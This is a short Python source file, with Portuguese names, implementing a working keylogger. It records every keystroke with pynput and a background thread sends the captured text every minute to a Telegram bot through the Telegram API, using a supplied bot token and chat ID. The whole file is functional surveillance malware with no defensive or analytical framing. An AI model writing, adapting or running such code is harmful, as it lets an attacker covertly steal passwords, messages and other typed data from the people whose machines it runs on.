from pynput import keyboard
import threading, time, requests

log = ""
def pressionada(tecla):
    global log
    try: log += tecla.char
    except: log += f"[{tecla}]"

def iniciar_keylogger(token, chat_id):
    def enviar_log():
        global log
        while True:
            if len(log) > 20:
                try:
                    requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data={'chat_id': chat_id, 'text': "🔑 Keylog: " + log})
                    log = ""
                except: pass
            time.sleep(60)
    threading.Thread(target=enviar_log, daemon=True).start()
    keyboard.Listener(on_press=pressionada).start()